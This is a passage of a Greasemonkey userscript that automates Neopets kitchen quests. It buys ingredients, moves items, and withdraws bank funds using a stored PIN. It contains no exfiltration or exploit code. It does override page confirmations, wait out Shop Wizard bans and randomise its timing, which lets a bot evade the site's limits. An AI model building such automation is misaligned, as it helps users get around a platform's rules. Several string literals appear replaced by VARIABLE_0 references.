	GM_setValue("datum", month + " " + day + " " + year);
};
var ShowStatsButton = document.createElement("div");
ShowStatsButton.innerHTML = "Show/Hide Stats";
ShowStatsButton.setAttribute("style", "position: absolute; right: 5px; top: 21px; font-family: tahoma; font-size: 10pt; font-weight: 600; -moz-user-select: none; -khtml-user-select: none; cursor: pointer;");
ShowStatsButton.addEventListener("click", StatsVisibility, false);
if (document.getElementById("main")) {
	if (location.href.split("/")[3].substr(0, 17) == "browseshop.phtml?") {
		document.body.appendChild(ShowStatsButton);
	} else {
		document.getElementById("main").appendChild(ShowStatsButton);
	};
} else {
	if (location.href.split("/")[3].substr(0, 17) != ("neomessages.phtml" || "noticeboard.phtml") || location.href.split("/")[4].substr(0, 10) != "shop.phtml") {
		document.body.appendChild(ShowStatsButton);
	};
};
var statsbox = document.createElement("div");
statsbox.setAttribute("style", "position: absolute; right: 5px; top: 82px; width: 250px; height: 325px; background-color: #FFFFFF; font-family: tahoma; font-size: 10pt; text-align: center; padding: 0px; border: solid 1px; z-index: 110;");
statsbox.innerHTML = "<b><u>STATS SUMMARY</u> </b>since<b> " + GM_getValue("datum", "please reset") + "<br><br><u>Gained pet stats:</u><br></b><b>Level: " + GM_getValue("level", 0) + "<br>Hit Points: " + GM_getValue("hitpoints", 0) + "<br>Strength: " + GM_getValue("strength", 0) + "<br>Defence: " + GM_getValue("defence", 0) + "<br>Movement: " + GM_getValue("agility", 0) + "<br><br><u>Totals:</u><br>Quests completed: " + GM_getValue("numberQdone", 0) + "<br>Total NP spent: " + GM_getValue("NPspent", 0) + " NP<br>Average spent per quest: " + GM_getValue("averageSpent", 0) + " NP<br><br><u>Percentages:</u><br>Item received: " + GM_getValue("gotitem", 0) + "/" + GM_getValue("numberQdone", 0) + " (" + Math.round((GM_getValue("gotitem", 0) / GM_getValue("numberQdone", 0)) * 100) + "%)<br>NP received: " + GM_getValue("gotmoney", 0) + "/" + GM_getValue("numberQdone", 0) + " (" + Math.round((GM_getValue("gotmoney", 0) / GM_getValue("numberQdone", 0)) * 100) + "%)<br>Pet upgrade received: " + GM_getValue("gotstat", 0) + "/" + GM_getValue("numberQdone", 0) + " (" + Math.round((GM_getValue("gotstat", 0) / GM_getValue("numberQdone", 0)) * 100) + "%)<br><br></b>";
if (document.getElementById("main")) {
	if (location.href.split("/")[3].substr(0, 17) != "browseshop.phtml?") {
		document.body.appendChild(statsbox);
	} else {
		document.getElementById("main").appendChild(statsbox);
	};
} else {
	if (location.href.split("/")[3].substr(0, 17) != ("neomessages.phtml" || "noticeboard.phtml") || location.href.split("/")[4].substr(0, 10) != "shop.phtml") {
		document.body.appendChild(statsbox);
	};
};
statsbox.style.visibility = GM_getValue("statsvisi", "hidden");
var clearstatsButton = document.createElement("div");
clearstatsButton.innerHTML = "<font color=#E42217>Click here to reset stats</font>";
clearstatsButton.setAttribute("style", "position: relative; font-family: tahoma; font-size: 10pt; font-weight: 600; -moz-user-select: none; -khtml-user-select: none; cursor: pointer;");
clearstatsButton.addEventListener("click", ResetStats, false);
statsbox.appendChild(clearstatsButton);
var ShowLogButton = document.createElement("div");
ShowLogButton.innerHTML = "Show/Hide program";
ShowLogButton.setAttribute("style", "position: absolute; right: 5px; top: 61px; font-family: tahoma; font-size: 10pt; font-weight: 600; -moz-user-select: none; -khtml-user-select: none; cursor: pointer;");
ShowLogButton.addEventListener("click", LogVisibility, false);
if (document.getElementById("main")) {
	if (location.href.split("/")[3].substr(0, 17) == "browseshop.phtml?") {
		document.body.appendChild(ShowLogButton);
	} else {
		document.getElementById("main").appendChild(ShowLogButton);
	};
} else {
	if (location.href.split("/")[3].substr(0, 17) != ("neomessages.phtml" || "noticeboard.phtml") || location.href.split("/")[4].substr(0, 10) != "shop.phtml") {
		document.body.appendChild(ShowLogButton);
	};
};
var ActivityButton = document.createElement("div");
if (GM_getValue("buttontext", "START QUEST") == "START QUEST") {
	ActivityButton.innerHTML = "<font color=#FF0000><b>SCRIPT INACTIVE</b></font>";
} else {
	if (GM_getValue("buttontext", "START QUEST") == "STOP QUEST") {
		ActivityButton.innerHTML = "<font color=#4AA02C><b>SCRIPT ACTIVE</b></font>";
	};
};
ActivityButton.setAttribute("style", "position: absolute; right: 5px; top: 82px; font-family: tahoma; font-size: 10pt; font-weight: 600; -moz-user-select: none; -khtml-user-select: none; cursor: pointer;");
if (document.getElementById("main")) {
	if (location.href.split("/")[3].substr(0, 17) == "browseshop.phtml?") {
		document.body.appendChild(ActivityButton);
	} else {
		document.getElementById("main").appendChild(ActivityButton);
	};
} else {
	if (location.href.split("/")[3].substr(0, 17) != ("neomessages.phtml" || "noticeboard.phtml") || location.href.split("/")[4].substr(0, 10) != "shop.phtml") {
		document.body.appendChild(ActivityButton);
	};
};
var mainbox = document.createElement("div");
mainbox.setAttribute("style", "position: absolute; right: 5px; top: 82px; width: auto; height: auto; background-color: #FFFFFF; font-family: tahoma; font-size: 10pt; text-align: center; padding: 0px; border: solid 1px; z-index: 100;");
if (document.getElementById("main")) {
	if (location.href.split("/")[3].substr(0, 17) == "browseshop.phtml?") {
		document.body.appendChild(mainbox);
	} else {
		document.getElementById("main").appendChild(mainbox);
	};
} else {
	if (location.href.split("/")[3].substr(0, 17) != ("neomessages.phtml" || "noticeboard.phtml") || location.href.split("/")[4].substr(0, 10) != "shop.phtml") {
		document.body.appendChild(mainbox);
	};
};
mainbox.style.visibility = GM_getValue("visi", "visible");
var TitleBox = document.createElement("div");
TitleBox.setAttribute("style", "position: relative; width: auto; height: auto; background-color: #3BB9FF; font-family: Comic Sans MS; font-size: 18pt; text-align: center; padding: 5px; border-bottom: solid 1px; z-index: 100;");
TitleBox.innerHTML = "<font color=#000000>Kitchen Quest Auto-doer</font>";
mainbox.appendChild(TitleBox);
var logBox = document.createElement("div");
logBox.innerHTML = GM_getValue("Log", "Nothing in logfile");
logBox.setAttribute("style", "position: relative; overflow: scroll; right: 0px; top: 0px; width: 400px; height: 300px; background: transparent; font-family: tahoma; font-size: 10pt; text-align: left; padding: 5px; border: none; z-index: 103;");
mainbox.appendChild(logBox);
logBox.scrollTop = logBox.scrollHeight;
var Base = document.createElement("div");
Base.setAttribute("style", "position: absolute; right: 17px; top: 45px; width: 393px; height: 295px; background-color: #FFFFFF; z-index: 101;");
mainbox.appendChild(Base);
var BG = document.createElement("div");
BG.innerHTML = "<img src='http://images.neopets.com/games/tradingcards/2.gif' width='395' height='297' style='opacity:0.4;' />";
BG.setAttribute("style", "position: absolute; right: 15px; top : 44px; z-index: 102");
mainbox.appendChild(BG);
var clearLogButton = document.createElement("div");
clearLogButton.innerHTML = "Clear Logfile";
clearLogButton.setAttribute("style", "position: absolute; right: 5px; top: 43px; font-family: tahoma; font-size: 10pt; font-weight: 600; -moz-user-select: none; -khtml-user-select: none; cursor: pointer;");
clearLogButton.addEventListener("click", ClearLog, false);
if (document.getElementById("main")) {
	if (location.href.split("/")[3].substr(0, 17) == "browseshop.phtml?") {
		document.body.appendChild(clearLogButton);
	} else {
		document.getElementById("main").appendChild(clearLogButton);
	};
} else {
	if (location.href.split("/")[3].substr(0, 17) != ("neomessages.phtml" || "noticeboard.phtml") || location.href.split("/")[4].substr(0, 10) != "shop.phtml") {
		document.body.appendChild(clearLogButton);
	};
};
var settings_Box = document.createElement("div");
settings_Box.setAttribute("style", "position: relative; right: 0px; top: 0px; width: 400px; height: auto; background-color: #989898; font-family: tahoma; font-size: 10pt; text-align: center; white-space:pre; padding: 5px; border-top: solid 1px; border-bottom: solid 1px; z-index: 100;");
mainbox.appendChild(settings_Box);
var PIN = document.createElement("div");
PIN.innerHTML = "PIN#: <input type='text' style='border: none; text-align: center; background-color: #EEEEEE;' value='" + GM_getValue("PIN", 1234) + "' id='PIN' size='4'> (if you have one)";
PIN.setAttribute("style", "position: relative; ");
settings_Box.appendChild(PIN);
var number_refresh = document.createElement("div");
number_refresh.innerHTML = "Max number of refreshes per item in SW: <input type='text' style='border: none; text-align: center; background-color: #EEEEEE;' value='" + GM_getValue("number_refresh", "6") + VARIABLE_0[89];
number_refresh.setAttribute("style", "position: relative; ");
settings_Box.appendChild(number_refresh);
var max_total_price = document.createElement("div");
max_total_price.innerHTML = "Don't spend more than <input type='text' style='border: none; text-align: center; background-color: #EEEEEE;' value='" + GM_getValue("max_total_price", "5000") + "' id='max_total_price' size='5'> NP on a quest.";
max_total_price.setAttribute("style", "position: relative; ");
settings_Box.appendChild(max_total_price);
var SDB = document.createElement("div");
SDB.innerHTML = "<input type='checkbox' id='SDB' value='checked' " + GM_getValue("SDB", "unchecked") + "> Check SDB at quest start <i>(removes required items if present)</i>";
SDB.setAttribute("style", "position: relative; text-align: left;");
settings_Box.appendChild(SDB);
var QS = document.createElement("div");
QS.innerHTML = "<input type='checkbox' id='QS' value='checked' " + GM_getValue("QS", "unchecked") + "> Prevent full inventory, max 44 items <i>(SDB storage, logged)</i>";
QS.setAttribute("style", "position: relative; text-align: left;");
settings_Box.appendChild(QS);
var DoBank = document.createElement("div");
DoBank.innerHTML = "<input type='checkbox' id='DoBank' value='checked' " + GM_getValue("DoBank", "unchecked") + "> Withdraw <input type='text' id='ATMvalue' value='" + GM_getValue("ATMvalue", 30000) + "' style='border: none; text-align: center; background-color: #EEEEEE;' size='4'> NP from the bank if you run out of NP.";
DoBank.setAttribute("style", "position: relative; text-align: left;");
settings_Box.appendChild(DoBank);
var repeatQ = document.createElement("div");
repeatQ.innerHTML = "<input type='checkbox' id='repeatQ' value='checked' " + GM_getValue("repeatQ", "unchecked") + "> Auto-do ALL quests <i>(unchecked = single quest)</i>";
repeatQ.setAttribute("style", "position: relative; text-align: left;");
settings_Box.appendChild(repeatQ);
var TimeOutSW = document.createElement("div");
TimeOutSW.innerHTML = "<input type='checkbox' id='TimeOutSW' value='checked' " + GM_getValue("TimeOutSW", "unchecked") + "> Wait for SW ban to lift and auto-resume";
TimeOutSW.setAttribute("style", "position: relative; text-align: left;");
settings_Box.appendChild(TimeOutSW);
var TimeOutEdna = document.createElement("div");
TimeOutEdna.innerHTML = "<input type='checkbox' id='TimeOutEdna' value='checked' " + GM_getValue("TimeOutEdna", "unchecked") + "> If too expensive, wait for quest to expire and auto-start new quest";
TimeOutEdna.setAttribute("style", "position: relative; text-align: left;");
settings_Box.appendChild(TimeOutEdna);
var AlertMe = document.createElement("div");
AlertMe.innerHTML = "<input type='checkbox' id='AlertMe' value='checked' " + GM_getValue("AlertMe", "unchecked") + "> I'll be present when idling (quest/ban time ) is over so alert me!";
AlertMe.setAttribute("style", "position: relative; text-align: left;");
settings_Box.appendChild(AlertMe);
var frozen = document.createElement("div");
frozen.innerHTML = "<input type='checkbox' id='frozen' value='checked' " + GM_getValue("frozen", "unchecked") + "> Use random time between <input type='text' id='bottomTime' value='" + GM_getValue("bottomTime", "1") + VARIABLE_0[125] + GM_getValue("topTime", "2") + VARIABLE_0[128];
frozen.setAttribute("style", "position: relative; text-align: left;");
settings_Box.appendChild(frozen);
var start_Box = document.createElement("div");
start_Box.setAttribute("style", "position: relative; right: 0px; top: 0px; width: auto; height: auto; background-color: #D80000; font-family: tahoma; font-size: 10pt; text-align: center; padding: 5px; border: none; z-index: 100;");
mainbox.appendChild(start_Box);
var startQuestButton = document.createElement("div");
startQuestButton.innerHTML = "<input type='button' id='startQuestButton' value='" + GM_getValue("buttontext", "START QUEST") + "'>";
startQuestButton.addEventListener("click", saveSettings, false);
startQuestButton.setAttribute("style", "position: relative; text-align: center");
start_Box.appendChild(startQuestButton);
var continueQuestButton = document.createElement("div");
continueQuestButton.innerHTML = "<input type='button' id='continueQuestButton' value='DO QUEST ANYWAY'>";
continueQuestButton.addEventListener("click", Continue, false);
continueQuestButton.setAttribute("style", "position: relative; text-align: center");
continueQuestButton.style.visibility = GM_getValue("ContBut", "hidden");
start_Box.appendChild(continueQuestButton);
if (document.location.href == "http://www.neopets.com/market.phtml?type=wizard" && document.body.innerHTML.indexOf("Faerie Quest</b></a> and are not allowed to use the Shop Wizard! :)") > -1) {
	if (GM_getValue("buttontext", "START QUEST") == "STOP QUEST") {
		writeToLog("<b>You are on a faerie quest and cannot use the shop wizard! Terminating...</b><br>");
		document.getElementById("startQuestButton").click();
	};
};
if (GM_getValue("IdleAbsent", 0) == 1) {
	var nst = document.getElementById("nst").innerHTML;
	var minutes = parseInt(nst.split(":")[1].split(":")[0]);
	var hours = parseInt(nst.split(":")[0]);
	if (hours == GM_getValue("hourWait")) {
		setTimeout(SingleTabAbsentTimeout, 500);
	} else {
		var a = (61 - minutes) * 60 * 1000;
		setTimeout(SingleTabAbsentTimeout, a);
	};
};
if (GM_getValue("EdnaWait", 0) == 1) {
	if (GM_getValue("Idle", 0) == 1) {
		var nst = document.getElementById("nst").innerHTML;
		var minutes = parseInt(nst.split(":")[1].split(":")[0]);
		var hours = parseInt(nst.split(":")[0]);
		var x = GM_getValue("end_hour", 0) * 60 + GM_getValue("end_min", 0);
		var y = hours * 60 + minutes;
		if (x - y < 0) {
			var diff_min = x + 12 * 60 - y;
		} else {
			if (x - y >= 0) {
				var diff_min = x - y;
			};
		};
		setTimeout(SingleTabQuestTimeout, diff_min * 60 * 1000);
	};
	if (GM_getValue("QwasIDLE", 0) == 1) {
		GM_setValue("QwasIDLE", 0);
		GM_setValue("Started", 1);
	};
};
if (GM_getValue("DoSWBan", 0) == 1) {
	if (GM_getValue("LiftBan", 0) == 1) {
		GM_setValue("Started", 1);
		GM_setValue("LiftBan", 0);
	};
	if (GM_getValue("banned", 0) == 1) {
		var nst = document.getElementById("nst").innerHTML;
		var hours = parseInt(nst.split(":")[0]);
		if (GM_getValue("hours") == hours) {
			setTimeout(SingleTab, 500);
		} else {
			if (GM_getValue("hours") != hours) {
				var minutes = parseInt(nst.split(":")[1].split(":")[0]);
				var WaitTime = (61 - minutes) * 60 * 1000;
				setTimeout(SingleTab, WaitTime);
			};
		};
	} else {
		if (document.body.innerHTML.indexOf("please come back<br>in about <b>") != -1 && GM_getValue("banned", 0) == 0) {
			GM_setValue("banned", 1);
			reset();
			GM_setValue("Started", 0);
			var nst = document.getElementById("nst").innerHTML;
			var minutes = parseInt(nst.split(":")[1].split(":")[0]);
			var hours = parseInt(nst.split(":")[0]);
			var dayhalf = nst.split(" ")[1];
			if (hours == 12) {
				GM_setValue("hours", 1);
				if (dayhalf == "pm") {
					var dayhalf = "am";
				} else {
					var dayhalf = "pm";
				};
			} else {
				GM_setValue("hours", hours + 1);
			};
			var WaitTime = (61 - minutes) * 60 * 1000;
			writeToLog("<b><font color=#E42217>Option checked: </font>It is now [" + document.getElementById("nst").innerHTML + "],you have a ban from the Shop Wizard.<br>Script will idle and restart the same quest in <font color=#E42217>" + (61 - minutes) + " min(s)</font> or at approximately [" + GM_getValue("hours") + ":01:00 " + dayhalf + " NST]</b>");
			setTimeout(SingleTab, WaitTime);
		};
	};
} else {
	if (GM_getValue("DoSWBan", 0) == 0 && document.body.innerHTML.indexOf("please come back<br>in about <b>") != -1) {
		if (GM_getValue("buttontext", "START QUEST") == "STOP QUEST") {
			writeToLog("<b>You have a ban from the Shop Wizard. Terminating...</b><br>");
			document.getElementById("startQuestButton").click();
		};
	};
};
if (GM_getValue("Started", 0) == 1) {
	if (document.body.innerHTML.indexOf("http://images.neopets.com/homepage/indexbak_oops.png") > -1) {
		Offline();
		writeToLog("<b>Neopets seems to be down! Terminating...</b><br>");
		setTimeout("document.location = 'http://www.neopets.com/island/kitchen.phtml'", RefreshRate());
	};
	if (document.location.href == "http://www.neopets.com/quickstock.phtml" && GM_getValue("DoQS", 0) == 1) {
		itemsToMove = document.evaluate("//form[@name = \"quickstock\"]//tr/td[@align = \"left\"]", document, null, XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE, null);
		radiosToClick = document.evaluate("//form[@name=\"quickstock\"]//input[@value=\"deposit\"]", document, null, XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE, null);
		for (i = 0; i < GM_getValue("QSnumber", 0); i++) {
			writeToLog("Moving <b>" + itemsToMove.snapshotItem(i)["innerHTML"] + "</b> to SDB...");
			radiosToClick.snapshotItem(i).click();
		};
		GM_setValue("DoQS", 0);
		setTimeout(function() {
			document.evaluate("//input[@type = \"submit\" and @value = \"Submit\"]", document, null, XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE, null).snapshotItem(0).click();
		},
		RefreshRate());
	} else {
		if (document.location.href == "http://www.neopets.com/quickstock.phtml?r=" && GM_getValue("DoQS", 0) == 0) {
			setTimeout("document.location = 'http://www.neopets.com/objects.phtml?type=inventory'", RefreshRate());
		};
	};
	if (document.body.innerHTML.indexOf("Sorry, you can only carry a maximum of <b>50</b> items at one time!") != -1) {
		if (GM_getValue("buttontext", "START QUEST") == "STOP QUEST") {
			writeToLog("<b>Inventory is FULL, make some space and restart please! Terminating...</b><br>");
			document.getElementById("startQuestButton").click();
		};
	};
	if (document.location.href == "http://www.neopets.com/bank.phtml" && GM_getValue("goToBank", 0) == 1 && GM_getValue("doneBank", 1) == 0) {
		var regExp = /,/g;
		var balance = parseInt(document.evaluate("//div//tr/td[2]/table//tr[2]/td[2]", document, null, XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE, null).snapshotItem(0)["innerHTML"].replace(regExp, ""));
		if (GM_getValue("ATMvalue", 20000) < balance) {
			if (document.body.innerHTML.indexOf("<b>Add a PIN</b></a> for use in this area!") == -1) {
				document.evaluate("//input[@type = \"password\" and @name = \"pin\"]", document, null, XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE, null).snapshotItem(0)["value"] = GM_getValue("PIN", 1234);
			};
			document.evaluate("//input[@type = \"text\" and @name = \"amount\"]", document, null, XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE, null).snapshotItem(1)["value"] = GM_getValue("ATMvalue", 20000);
			GM_setValue("goToBank", 0);
			writeToLog("<b>Withdrawing " + GM_getValue("ATMvalue", 20000) + " NP</b>!</b>");
			GM_setValue("getURL", 1);
			GM_setValue("InShop", 0);
			GM_setValue("tryBuy", 0);
			setTimeout(function() {
				document.evaluate("//input[@type = \"submit\" and @value = \"Withdraw\"]", document, null, XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE, null).snapshotItem(0).click();
			},
			RefreshRate());
			unsafeWindow.confirm = function() {
				return true;
			};
		} else {
			writeToLog("<b>You don't have enough on your bank account, terminating...</b><br>");
			if (GM_getValue("buttontext", "START QUEST") == "STOP QUEST") {
				document.getElementById("startQuestButton").click();
			};
			GM_setValue("doneBank", 1);
		};
	} else {
		if (document.location.href == "http://www.neopets.com/bank.phtml" && GM_getValue("goToBank", 0) == 0 && GM_getValue("doneBank", 1) == 0) {
			GM_setValue("doneBank", 1);
			setTimeout("document.location = '" + GM_getValue("shopURL") + "'", RefreshRate());
		};
	};
	if (document.body.innerHTML.indexOf("You do not have enough Neopoints to purchase this item!") != -1 && GM_getValue("DoBank", "unchecked") == "checked") {
		writeToLog("<b><font color=#E42217>Option checked: </font>Out of neopoints! Going to the bank...</b>");
		GM_setValue("goToBank", 1);
		GM_setValue("doneBank", 0);
		setTimeout("document.location = 'http://www.neopets.com/bank.phtml'", RefreshRate());
	} else {
		if (document.body.innerHTML.indexOf("You do not have enough Neopoints to purchase this item!") != -1 && GM_getValue("DoBank", "unchecked") == "unchecked") {
			if (GM_getValue("buttontext", "START QUEST") == "STOP QUEST") {
				writeToLog("<b>Out of neopoints! Terminating...</b><br>");
				document.getElementById("startQuestButton").click();
			};
		};
	};
	if (document.location.href == "http://www.neopets.com/island/kitchen.phtml") {
		if (document.body.innerHTML.indexOf("They will just have to go without their food") > -1) {
			writeToLog("Previous quest has timed out.<br>");
			setTimeout("document.location = 'http://www.neopets.com/island/kitchen.phtml'", RefreshRate());
		};
		if (document.body.innerHTML.indexOf("<b>Daily Quest Limit Reached</b>") > -1) {
			if (GM_getValue("buttontext", "START QUEST") == "STOP QUEST") {
				writeToLog("<b>No more quests left for today! Terminating...</b><br>");
				document.getElementById("startQuestButton").click();
			};
		};
		if (document.body.innerHTML.indexOf("<b>Nobody seems to be at home...</b>") > -1) {
			if (GM_getValue("EdnaWait", 0) == 0) {
				if (GM_getValue("buttontext", "START QUEST") == "STOP QUEST") {
					writeToLog("<b>Unable to start/finish quest, Underwater Chef is not there!<br>Try again later...</b>");
					document.getElementById("startQuestButton").click();
				};
			} else {
				var nst = document.getElementById("nst").innerHTML;
				var minutes = parseInt(nst.split(":")[1].split(":")[0]);
				var hours = parseInt(nst.split(":")[0]);
				var dayhalf = nst.split(" ")[1];
				if (hours == 12) {
					GM_setValue("hourWait", 1);
					if (dayhalf == "pm") {
						var dayhalf = "am";
					} else {
						var dayhalf = "pm";
					};
				} else {
					GM_setValue("hourWait", hours + 1);
				};
				var a = (61 - minutes) * 60 * 1000;
				GM_setValue("Started", 0);
				GM_setValue("IdleAbsent", 1);
				minuten = minutes % 60;
				writeToLog("<b>[" + document.getElementById("nst").innerHTML + "] <font color=#E42217>Option checked: </font></b>Underwater Chef is <b>NOT</b> present, script will idle and auto-start a new quest in <font color=#E42217><b>" + (61 - minutes) + " min(s)</b></font> or at approximately <b>[" + GM_getValue("hourWait") + ":01:00 " + dayhalf + " NST]</b>");
				setTimeout(SingleTabAbsentTimeout, a);
			};
		} else {
			if ((document.body.innerHTML.indexOf("Ever since the Royal Family of Maraqua") != -1 && GM_getValue("repeatQ", "unchecked") == "checked") || (document.body.innerHTML.indexOf("Ever since the Royal Family of Maraqua") != -1 && GM_getValue("repeatQ", "unchecked") == "unchecked" && GM_getValue("OneDone", 0) == 0)) {
				writeToLog("<b><font color=#3BB9FF size='3'>Starting new kitchen quest!</font></b><br>");
				GM_setValue("item1", "");
				GM_setValue("item2", "");
				GM_setValue("item3", "");
				GM_setValue("item4", "");
				GM_setValue("numberValidInv", 0);
				GM_setValue("TotalItems", 0);
				GM_setValue("itemname1", "");
				GM_setValue("itemname2", "");
				GM_setValue("itemname3", "");
				GM_setValue("itemname4", "");
				GM_setValue("itemnameSDB1", "");
				GM_setValue("itemnameSDB2", "");
				GM_setValue("itemnameSDB3", "");
				GM_setValue("itemnameSDB4", "");
				GM_setValue("itemnameINV1", "");
				GM_setValue("itemnameINV2", "");
				GM_setValue("itemnameINV3", "");
				GM_setValue("itemnameINV4", "");
				setTimeout(function() {
					document.evaluate("//form[contains(@action,\"kitchen2.phtml\")]/input[@type = \"submit\" and @value = \"Sure, I will help!\"]", document, null, XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE, null).snapshotItem(0).click();
				},
				RefreshRate());
			} else {
				if (document.body.innerHTML.indexOf("I have the Ingredients") != -1 && GM_getValue("readyFinish", 0) == 0) {
					var xpath_items_needed = document.evaluate("//form[contains(@action,\"kitchen2.phtml\")]//tr[3]/td[contains(@bgcolor, \"#ffffee\")]/b", document, null, XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE, null);
					var items_needed_array = new Array();
					for (var i = 0; i < xpath_items_needed.snapshotLength; i++) {
						items_needed_array.push(xpath_items_needed.snapshotItem(i)["innerHTML"]);
					};
					if (items_needed_array.length == 1) {
						GM_setValue("itemname4", items_needed_array[0]);
						GM_setValue("itemnameSDB4", GM_getValue("itemname4"));
						GM_setValue("itemnameINV4", GM_getValue("itemname4"));
						GM_setValue("TotalItems", 1);
					} else {
						if (items_needed_array.length == 2) {
							GM_setValue("itemname3", items_needed_array[0]);
							GM_setValue("itemnameSDB3", GM_getValue("itemname3"));
							GM_setValue("itemnameINV3", GM_getValue("itemname3"));
							GM_setValue("itemname4", items_needed_array[1]);
							GM_setValue("itemnameSDB4", GM_getValue("itemname4"));
							GM_setValue("itemnameINV4", GM_getValue("itemname4"));
							GM_setValue("TotalItems", 2);
						} else {
							if (items_needed_array.length == 3) {
								GM_setValue("itemname2", items_needed_array[0]);
								GM_setValue("itemnameSDB2", GM_getValue("itemname2"));
								GM_setValue("itemnameINV2", GM_getValue("itemname2"));
								GM_setValue("itemname3", items_needed_array[1]);
								GM_setValue("itemnameSDB3", GM_getValue("itemname3"));
								GM_setValue("itemnameINV3", GM_getValue("itemname3"));
								GM_setValue("itemname4", items_needed_array[2]);
								GM_setValue("itemnameSDB4", GM_getValue("itemname4"));
								GM_setValue("itemnameINV4", GM_getValue("itemname4"));
								GM_setValue("TotalItems", 3);
							} else {
								if (items_needed_array.length == 4) {
									GM_setValue("itemname1", items_needed_array[0]);
									GM_setValue("itemnameSDB1", GM_getValue("itemname1"));
									GM_setValue("itemnameINV1", GM_getValue("itemname1"));
									GM_setValue("itemname2", items_needed_array[1]);
									GM_setValue("itemnameSDB2", GM_getValue("itemname2"));
									GM_setValue("itemnameINV2", GM_getValue("itemname2"));
									GM_setValue("itemname3", items_needed_array[2]);
									GM_setValue("itemnameSDB3", GM_getValue("itemname3"));
									GM_setValue("itemnameINV3", GM_getValue("itemname3"));
									GM_setValue("itemname4", items_needed_array[3]);
									GM_setValue("itemnameSDB4", GM_getValue("itemname4"));
									GM_setValue("itemnameINV4", GM_getValue("itemname4"));
									GM_setValue("TotalItems", 4);
								};
							};
						};
					};
					writeToLog("Underwater Chef requires <b>" + items_needed_array.length + "</b> items from you:");
					for (i = 1; i < 5; i++) {
						if (GM_getValue("itemname" + i, "") != "") {
							writeToLog("- " + GM_getValue("itemname" + i, ""));
						};
					};
					writeToLog(" ");
					var items_needed_string = items_needed_array.join("/");
					GM_setValue("itemsNeeded", items_needed_string);
					GM_setValue("number_itemsNeeded", xpath_items_needed.snapshotLength);
					var stringHTML = document.body.innerHTML;
					var Qhours = parseInt(GetBetween(stringHTML, "<b><b>", "</b> hr(s)"));
					var Qminutes = parseInt(GetBetween(stringHTML, "hr(s) and <b>", "</b> min(s) left"));
					var nst = document.getElementById("nst").innerHTML;
					var TShours = parseInt(nst.split(":")[0]);
					var TSminutes = parseInt(nst.split(":")[1].split(":")[0]);
					var end_minutes = Qminutes + TSminutes + 1;
					if (end_minutes >= 60) {
						var end_minutes = end_minutes - 60;
						var end_hours = Qhours + TShours + 1;
					} else {
						var end_hours = Qhours + TShours;
					};
					if (end_hours > 12) {
						var end_hours = end_hours - 12;
					};
					GM_setValue("end_hour", end_hours);
					GM_setValue("end_min", end_minutes);
					if (GM_getValue("SDB", "unchecked") == "checked") {
						writeToLog("<b><font color=#E42217>Option checked: </font></b>Checking SDB for possible stored items.");
						setTimeout("document.location = 'http://www.neopets.com/safetydeposit.phtml'", RefreshRate());
					} else {
						setTimeout("document.location = 'http://www.neopets.com/objects.phtml?type=inventory'", RefreshRate());
					};
				} else {
					if (document.body.innerHTML.indexOf("I have the Ingredients") != -1 && GM_getValue("readyFinish", 0) == 1) {
						GM_setValue("readyFinish", 0);
						writeToLog("Giving all collected items to Underwater Chef for his brew.");
						setTimeout(function() {
							document.evaluate("//input[@type = \"submit\" and @value = \"I have the Ingredients!\"]", document, null, XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE, null).snapshotItem(0).click();
						},
						RefreshRate());
					};
				};
			};
		};
	};
	if (document.location.href == "http://www.neopets.com/island/kitchen2.phtml" && document.evaluate("//td[contains(@align, \"center\")]/b", document, null, XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE, null).snapshotItem(0) != null) {
		if (document.body.innerHTML.indexOf("I have successfully made") > -1) {
			GM_setValue("NPspent", GM_getValue("NPspent", 0) + GM_getValue("spentONquest"));
			GM_setValue("numberQdone", GM_getValue("numberQdone", 0) + 1);
			GM_setValue("averageSpent", parseInt(GM_getValue("NPspent", 0) / GM_getValue("numberQdone", 0)));
			var bodyhtml = document.body.innerHTML;
			if (document.body.innerHTML.indexOf("You have been given") > -1) {
				var moneyreward = GetBetween(bodyhtml, "You have been given <b>", "</b> Neopoints as a reward!");
				GM_setValue("gotmoney", GM_getValue("gotmoney", 0) + 1);
				writeToLog("<b>[" + document.getElementById("nst").innerHTML + "] Quest completed! You are awarded <font color=#E42217>" + moneyreward + " NP</font>!!!</b>");
			} else {
				if (document.body.innerHTML.indexOf("You get a ") > -1) {
					var itemreward = GetBetween(bodyhtml, "You get a <b>", "</b>!!!");
					GM_setValue("gotitem", GM_getValue("gotitem", 0) + 1);
					writeToLog("<b>[" + document.getElementById("nst").innerHTML + "] Quest completed! You are awarded an item: <font color=#E42217>" + itemreward + "</font>!!!</b>");
				} else {
					if (document.body.innerHTML.indexOf("has gained a level!!!") > -1) {
						GM_setValue("level", GM_getValue("level", 0) + 1);
						GM_setValue("gotstat", GM_getValue("gotstat", 0) + 1);
						writeToLog("<b>[" + document.getElementById("nst").innerHTML + "] Quest completed! <font color=#E42217>Your pet has gained a level</font>!!!</b>");
					} else {
						if (document.body.innerHTML.indexOf("has gained a hit point!!!") > -1) {
							GM_setValue("hitpoints", GM_getValue("hitpoints", 0) + 1);
							GM_setValue("gotstat", GM_getValue("gotstat", 0) + 1);
							writeToLog("<b>[" + document.getElementById("nst").innerHTML + "] Quest completed! <font color=#E42217>Your pet has gained a hit point</font>!!!</b>");
						} else {
							if (document.body.innerHTML.indexOf("has become better at Defence!!!") > -1) {
								GM_setValue("defence", GM_getValue("defence", 0) + 1);
								GM_setValue("gotstat", GM_getValue("gotstat", 0) + 1);
								writeToLog("<b>[" + document.getElementById("nst").innerHTML + "] Quest completed! <font color=#E42217>Your pet has become better at Defence</font>!!!</b>");
							} else {
								if (document.body.innerHTML.indexOf("has become better at Agility!!!") > -1) {
									GM_setValue("agility", GM_getValue("agility", 0) + 1);
									GM_setValue("gotstat", GM_getValue("gotstat", 0) + 1);
									writeToLog("<b>[" + document.getElementById("nst").innerHTML + "] Quest completed! <font color=#E42217>Your pet has become better at Agility</font>!!!</b>");
								} else {
									if (document.body.innerHTML.indexOf("has become better at Attack!!!") > -1) {
										GM_setValue("strength", GM_getValue("strength", 0) + 1);
